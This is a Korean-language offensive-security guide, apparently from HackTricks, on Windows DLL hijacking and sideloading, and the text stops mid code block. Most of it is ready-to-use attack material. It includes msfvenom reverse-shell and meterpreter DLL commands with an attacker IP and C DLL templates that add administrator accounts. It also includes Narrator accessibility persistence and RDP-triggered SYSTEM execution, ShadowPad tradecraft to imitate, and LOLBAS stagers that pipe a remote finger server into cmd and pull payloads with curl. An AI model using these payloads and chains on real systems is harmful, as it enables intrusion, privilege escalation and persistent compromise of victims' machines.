# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰되는 애플리케이션이 악성 DLL을 로드하도록 조작하는 기법입니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포괄합니다. 주로 code execution, persistence 달성에 사용되며, 권한 상승(escalation)은 덜 일반적인 용도입니다. 여기서는 escalation에 초점을 맞추고 있지만, hijacking 방법은 목적에 상관없이 일관됩니다.

### 일반적인 기법들

DLL hijacking에는 애플리케이션의 DLL 로딩 전략에 따라 여러 방법이 사용됩니다:

1. **DLL Replacement**: 정식 DLL을 악성 DLL로 교체하고, 원래 DLL의 기능을 유지하려면 DLL Proxying을 사용할 수 있습니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 정당한 DLL보다 먼저 검색되는 경로에 두어 애플리케이션의 검색 패턴을 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 필요로 하는데 존재하지 않는 DLL 이름으로 악성 DLL을 만들어 로드되도록 합니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일 같은 검색 매개변수를 수정하여 애플리케이션이 악성 DLL을 가리키도록 합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 정식 DLL을 악성 DLL로 대체하는 방법으로, 종종 DLL side-loading과 연관됩니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자가 제어하는 디렉터리에 악성 DLL을 두는 방식으로, Binary Proxy Execution 기법과 유사합니다.

> [!TIP]
> HTML staging, AES-CTR configs, .NET implants를 DLL sideloading 위에 레이어링한 단계별 체인을 보려면 아래 워크플로를 검토하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

시스템 내에서 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고, **다음 2개의 필터**를 설정하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시하세요:

![](<../../../images/image (153).png>)

일반적으로 **누락된 dll을 찾고 있다면** 이 상태로 몇 **초** 동안 실행해 둡니다.\
특정 실행 파일 내의 **누락된 dll**을 찾고 있다면, `Process Name` `"contains"` `<exec name>` 같은 추가 필터를 설정한 뒤 실행하고 이벤트 캡처를 중지하세요.

## Exploiting Missing Dlls

권한을 상승하려면, privilege 프로세스가 로드하려 할 악성 dll을 그 프로세스가 검색할 위치들 중 하나에 쓸 수 있어야 합니다. 따라서 원본 dll이 있는 폴더보다 먼저 검색되는 폴더에 dll을 쓸 수 있거나(드문 경우), 해당 dll이 어떤 폴더에도 존재하지 않아 프로세스가 검색하는 폴더에 우리가 쓸 수 있는 경우가 가장 좋은 기회입니다.

### Dll Search Order

[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.

Windows 애플리케이션은 미리 정의된 검색 경로 집합을 따라 특정 순서로 DLL을 찾습니다. 위험은 악성 DLL을 이 경로들 중 하나에 전략적으로 배치하여 정식 DLL보다 먼저 로드되도록 할 때 발생합니다. 이를 방지하는 한 가지 방법은 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 하는 것입니다.

다음은 32-bit 시스템에서의 **DLL search order**입니다:

1. 애플리케이션이 로드된 디렉터리.
2. 시스템 디렉터리. 이 디렉터리 경로는 [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용해 얻습니다.(_C:\Windows\System32_)
3. 16-bit 시스템 디렉터리. 이 디렉터리 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows 디렉터리. 이 디렉터리 경로는 [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용해 얻습니다.
1. (_C:\Windows_)
5. 현재 디렉터리.
6. PATH 환경 변수에 나열된 디렉터리들. 여기에는 **App Paths** 레지스트리에 의해 지정된 애플리케이션별 경로는 포함되지 않는다는 점에 유의하세요. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

이는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 해당 기능이 비활성화되면 현재 디렉터리가 두 번째 위치로 상승합니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하세요(기본은 활성화).

만약 [LoadLibraryEx](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그와 함께 호출되면 검색은 LoadLibraryEx가 로드하는 실행 모듈의 디렉터리에서 시작됩니다.

마지막으로, **dll이 이름 대신 절대 경로를 지정하여 로드될 수 있음**을 유의하세요. 그런 경우 해당 dll은 그 경로에서만 검색됩니다(해당 dll에 종속성이 있으면, 그들은 이름으로 로드된 것처럼 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Chaining an arbitrary file write into a missing-DLL hijack

1. **ProcMon** 필터를 사용하여 (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) 프로세스가 탐색했지만 찾지 못한 DLL 이름들을 수집합니다.
2. 바이너리가 **schedule/service**로 실행되는 경우, 이러한 이름 중 하나로 된 DLL을 **application directory**(search-order entry #1)에 떨어뜨리면 다음 실행 시 로드됩니다. 한 .NET 스캐너 사례에서는 프로세스가 실제 복사본을 `C:\Program Files\dotnet\fxr\...`에서 로드하기 전에 `C:\samples\app\`에서 `hostfxr.dll`을 찾았습니다.
3. 임의의 export를 가진 payload DLL(예: reverse shell)을 빌드: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. primitive가 **ZipSlip-style arbitrary write**인 경우, 압축 해제 디렉터리를 벗어나도록 엔트리를 조작한 ZIP을 만들어 DLL이 앱 폴더에 놓이도록 만듭니다:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 아카이브를 감시되는 inbox/share에 전달합니다; 스케줄된 작업이 프로세스를 다시 실행하면 프로세스는 악성 DLL을 로드하고 서비스 계정으로 코드를 실행합니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

신규 생성된 프로세스의 DLL 검색 경로를 결정론적으로 제어하는 고급 방법은 ntdll의 native API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기서 공격자가 제어하는 디렉토리를 제공하면, 대상 프로세스가 임포트된 DLL을 이름으로(절대 경로 없이, 안전 로드 플래그를 사용하지 않고) 해석할 때 해당 디렉토리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 파라미터를 구성하고 DllPath에 공격자가 제어하는 폴더(예: dropper/unpacker가 위치한 디렉토리)를 지정합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 해석할 때 로더는 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 같은 위치에 없더라도 신뢰할 수 있는 sideloading이 가능합니다.

참고/제한사항
- 이것은 생성되는 자식 프로세스에 영향을 미치며, 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 DLL을 이름으로 import하거나 LoadLibrary해야 합니다(절대 경로가 아니고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않아야 함).
- KnownDLLs 및 하드코딩된 절대 경로는 hijack할 수 없습니다. Forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.

간단한 C 예제 (ntdll, wide strings, 오류 처리 간소화):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

운영 사용 예
- 악성 xmllite.dll (필요한 함수를 export하거나 실제 DLL로 proxy하는)을 DllPath 디렉터리에 배치합니다.
- 위 기법을 사용해 xmllite.dll을 이름으로 찾는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 import를 해결하고 당신의 DLL을 sideload합니다.

이 기법은 실제 환경에서 multi-stage sideloading chains를 유도하는 데 사용되는 것이 관찰되었습니다: 초기 런처가 helper DLL을 드롭하고, 그 다음 그것이 Microsoft-signed된 hijackable 바이너리를 사용자 지정 DllPath로 실행하여 staging directory에서 공격자의 DLL을 강제 로드하게 합니다.


#### Windows 문서에서의 dll 검색 순서 예외사항

표준 DLL 검색 순서에 대한 몇 가지 예외가 Windows 문서에 언급되어 있습니다:

- **이미 메모리에 로드된 DLL과 이름을 공유하는 DLL**가 발견되면, 시스템은 일반적인 검색을 우회합니다. 대신 redirection과 manifest를 확인한 뒤 기본적으로 이미 메모리에 있는 DLL을 사용합니다. **이 경우 시스템은 DLL을 검색하지 않습니다**.
- DLL이 현재 Windows 버전에서 **known DLL**로 인식되는 경우, 시스템은 해당 known DLL의 버전과 그에 의존하는 DLL들을 사용하여 **검색 과정을 생략**합니다. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 known DLL들의 목록이 저장되어 있습니다.
- **DLL에 종속성이 있는 경우**, 이러한 종속 DLL의 검색은 초기 DLL이 전체 경로로 지정되었는지와 관계없이 마치 오직 **module names**로만 지정된 것처럼 수행됩니다.

### 권한 상승

**요구 사항**:

- **다른 권한**(horizontal or lateral movement)으로 동작하거나 동작할 프로세스 중, **DLL이 없는** 것을 식별합니다.
- **write access**가 확보된 **directory**(DLL이 검색될 위치)가 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 path 내의 디렉터리일 수 있습니다.

예, 요구 조건을 찾기는 까다롭습니다. **기본적으로 권한이 있는 실행 파일이 DLL을 빠뜨린 상태로 있는 경우를 찾는 것은 이상한 일**이며, **시스템 경로 폴더에 쓰기 권한을 갖는 것은 더더욱 드문 일**입니다(기본적으로는 불가능합니다). 하지만 잘못 구성된 환경에서는 이것이 가능할 수 있습니다.  
운이 좋아 요구사항을 충족한다면, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. 프로젝트의 **main goal of the project is bypass UAC**이긴 하지만, 거기에서 사용 가능한 Windows 버전에 대한 Dll hijaking의 **PoC**를 찾을 수 있을지도 모릅니다(아마도 단지 당신에게 쓰기 권한이 있는 폴더의 경로만 바꾸면 됩니다).

참고로 **폴더에서 권한을 확인하는 방법**은 다음과 같습니다:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내의 모든 폴더의 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
또한 다음을 사용해 executable의 imports와 dll의 exports를 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 안의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 찾는 데 유용한 다른 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_가 있습니다.

### 예제

취약한 시나리오를 찾았을 경우, 성공적으로 악용하기 위한 가장 중요한 점 중 하나는 **실행 파일이 해당 DLL에서 import할 모든 함수들을 적어도 전부 export하는 dll을 만드는 것**입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.**와 같이 권한 상승에 유용하게 사용될 수 있습니다. 실행을 위한 dll hijacking에 초점을 맞춘 이 dll hijacking 연구에서 **how to create a valid dll**의 예를 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **다음 섹션**에서는 **템플릿으로 유용하거나 불필요한 함수들을 export한 dll을 만드는 데 사용할 수 있는 몇 가지 기본 dll 코드들**을 찾을 수 있습니다.

## **Dlls 생성 및 컴파일**

### **Dll 프록시화**

기본적으로 **Dll proxy**는 로드될 때 **malicious code를 실행**할 수 있으면서도, 모든 호출을 실제 라이브러리로 전달함으로써 **노출**되고 **동작**하게 하는 Dll입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 실행 파일을 지정하고 proxify하려는 라이브러리를 선택하여 **proxified dll을 생성**하거나, Dll을 지정하여 **proxified dll을 생성**할 수 있습니다.

### **Meterpreter**

**rev shell (x64) 얻기:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86, x64 버전은 보지 못함):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 자신만의

참고: 몇몇 경우 컴파일하는 Dll은 victim process가 로드할 여러 함수를 반드시 **export several functions**해야 합니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load**하고 **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 생성 포함)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 진입점이 있는 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 여전히 탐색하며, 이는 arbitrary code execution 및 persistence를 위해 hijacked될 수 있습니다.

핵심 사실
- 탐색 경로(현재 빌드): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 레거시 경로(이전 빌드): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore 경로에 쓰기 가능한 공격자가 제어하는 DLL이 존재하면 해당 DLL이 로드되고 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. 내보내기(exports)는 필요 없습니다.

Procmon으로 탐지
- 필터: `Process Name is Narrator.exe` 및 `Operation is Load Image` 또는 `CreateFile`.
- Narrator를 시작하고 위 경로의 로드 시도를 관찰하세요.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator를 시작하면 심어둔 DLL이 로드됩니다. 보안 데스크톱(로그온 화면)에서는 CTRL+WIN+ENTER를 눌러 Narrator를 시작하세요; 해당 DLL이 보안 데스크톱에서 SYSTEM 권한으로 실행됩니다.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- 실행은 RDP 세션이 닫히면 중단됩니다 — 신속히 inject/migrate 하세요.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## 사례 연구: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. As a standard user, drop `hostfxr.dll` into `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. 예약된 작업이 현재 사용자 컨텍스트에서 오전 9:30에 실행될 때까지 대기합니다.
3. 작업이 실행될 때 관리자가 로그인한 상태이면, 악성 DLL이 관리자의 세션에서 medium integrity로 실행됩니다.
4. 표준 UAC bypass 기법을 연결하여 medium integrity에서 SYSTEM 권한으로 권한 상승합니다.

## 사례 연구: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

위협 행위자는 신뢰된 서명된 프로세스 하에서 페이로드를 실행하기 위해 MSI 기반 dropper를 DLL side-loading과 자주 결합합니다.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe를 이용한 Practical sideloading
- 이 두 파일을 동일한 폴더에 넣습니다:
- wsc_proxy.exe: 정식으로 서명된 호스트(Avast). 프로세스는 자신의 디렉터리에서 이름으로 wsc.dll을 로드하려 시도합니다.
- wsc.dll: 공격자 DLL. 특정 exports가 필요 없다면 DllMain으로 충분합니다; 그렇지 않으면 proxy DLL을 만들어 필요한 exports를 genuine library로 포워딩하면서 DllMain에서 payload를 실행하세요.
- 최소한의 DLL payload를 빌드합니다:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 익스포트 요구사항이 있을 경우, DLLirant/Spartacus 같은 프록시 프레임워크를 사용해 페이로드도 실행하는 포워딩 DLL을 생성하라.

- 이 기법은 호스트 바이너리의 DLL 이름 해석에 의존한다. 호스트가 절대 경로나 안전 로딩 플래그(e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 하이재킹이 실패할 수 있다.
- KnownDLLs, SxS, 및 forwarded exports는 우선순위에 영향을 줄 수 있으므로 호스트 바이너리와 익스포트 집합을 선택할 때 고려해야 한다.

## 서명된 트라이어드 + 암호화된 페이로드 (ShadowPad case study)

Check Point는 Ink Dragon이 ShadowPad를 디스크에 핵심 페이로드를 암호화된 상태로 유지하면서 합법적 소프트웨어에 섞어 배포하기 위해 **three-file triad**를 어떻게 사용하는지 설명했다:

1. **Signed host EXE** – AMD, Realtek, 또는 NVIDIA 같은 벤더의 바이너리(`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)가 악용된다. 공격자는 실행파일 이름을 Windows 바이너리처럼 보이게(예: `conhost.exe`) 변경하지만 Authenticode 서명은 유효하게 남아 있다.
2. **Malicious loader DLL** – EXE 옆에 예상되는 이름(`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`)으로 드롭된다. 해당 DLL은 보통 ScatterBrain 프레임워크로 난독화된 MFC 바이너리이며, 유일한 역할은 암호화된 블롭을 찾아 복호화하고 ShadowPad를 reflective map 하는 것이다.
3. **Encrypted payload blob** – 종종 같은 디렉터리의 `<name>.tmp`로 저장된다. 복호화된 페이로드를 메모리 매핑한 후 로더는 포렌식 증거를 없애기 위해 TMP 파일을 삭제한다.

Tradecraft notes:

* 서명된 EXE의 이름을 변경하되 PE 헤더의 원본 `OriginalFileName`을 유지하면 Windows 바이너리처럼 가장하면서도 벤더 서명을 유지할 수 있다. 따라서 Ink Dragon이 실제로는 AMD/NVIDIA 유틸리티인 `conhost.exe`처럼 보이는 바이너리를 드롭한 관행을 모방하라.
* 실행파일이 신뢰된 상태로 유지되므로 대부분의 allowlisting 제어는 악성 DLL이 그 옆에 위치하는 것만으로도 충분하다. 로더 DLL 커스터마이징에 집중하라; 서명된 부모는 일반적으로 변경 없이 실행될 수 있다.
* ShadowPad의 복호화기는 TMP 블롭이 로더 옆에 존재하며 매핑 후 파일을 제로화할 수 있도록 쓰기 가능(writeable)해야 한다고 기대한다. 페이로드가 로드될 때까지 디렉터리를 쓰기 가능하게 유지하라; 일단 메모리에 올라가면 TMP 파일은 OPSEC을 위해 안전하게 삭제할 수 있다.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

운영자들은 DLL sideloading을 LOLBAS와 결합해 디스크에 남는 커스텀 아티팩트가 신뢰된 EXE 옆의 악성 DLL 하나뿐이 되도록 한다:

- **Remote command loader (Finger):** 은닉된 PowerShell이 `cmd.exe /c`를 생성하고 Finger 서버에서 명령을 가져와 `cmd`로 파이핑한다:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`는 TCP/79로 텍스트를 가져오고; `| cmd`는 서버 응답을 실행해 운영자가 서버 측에서 세컨드 스테이지를 교체할 수 있게 한다.

- **Built-in download/extract:** 무해해 보이는 확장자를 가진 아카이브를 다운로드하고 이를 풀어 sideload 대상과 DLL을 임의의 `%LocalAppData%` 폴더 아래에 스테이징한다:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`은 진행을 숨기고 리다이렉트를 따른다; `tar -xf`는 Windows 내장 tar를 사용한다.

- **WMI/CIM launch:** EXE를 WMI로 시작해 원격 모니터링에 CIM이 생성한 프로세스로 표시되게 하면서 같은 위치의 DLL을 로드하게 한다:

```powershell
